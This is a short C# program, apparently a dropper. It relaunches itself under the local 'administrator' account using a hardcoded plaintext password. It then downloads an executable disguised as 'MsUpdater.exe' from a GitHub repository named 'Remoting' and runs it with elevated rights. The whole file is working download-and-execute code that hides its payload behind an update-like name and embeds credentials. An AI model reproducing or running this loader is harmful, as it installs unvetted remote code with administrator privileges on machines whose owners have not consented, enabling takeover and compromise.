namespace Bootstrap
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Security;
    using System.Security.Principal;

    internal class Program
    {

        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                var password = new SecureString();

                foreach (var a in "abc123kappa")
                {
                    password.AppendChar(a);
                }

                Process.Start(typeof(Program).Assembly.Location, "administrator", password, string.Empty);
                return;
            }

            var target = Path.Combine(Directory.GetCurrentDirectory(), "MsUpdater.exe");

            if (File.Exists(target))
            {
                File.Delete(target);
            }

            const string Download = "https://github.com/Wiciaki/Remoting/blob/master/Downloads/MsUpdater.exe?raw=true";

            using (var client = new WebClient())
            {
                client.DownloadFile(Download, target);
            }

            Process.Start(target);
        }
    }
}